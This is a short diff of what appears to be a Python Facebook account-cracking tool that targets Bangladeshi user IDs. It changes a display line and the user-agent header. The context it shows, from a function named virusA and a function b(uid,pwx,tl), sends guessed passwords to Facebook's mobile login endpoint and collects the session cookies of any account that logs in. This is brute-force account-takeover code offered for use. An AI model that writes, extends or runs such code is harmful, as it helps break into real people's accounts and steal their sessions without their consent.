@@ -223,7 +223,7 @@ def virusA():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('〘✧〙COUNTRY    : Bangladesh')
+		print('〘✧〙COUNTRY    :  Bangladesh')
 		print('〘✧〙TOTAL ID   :  '+tl)
 		print(f'〘✧〙SIM CODE   : \033[1;92m {kode} ')
 		print('〘✧〙START BD UID MIXT CRACKING... ')
@@ -281,7 +281,7 @@ def b(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'pro',
             'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
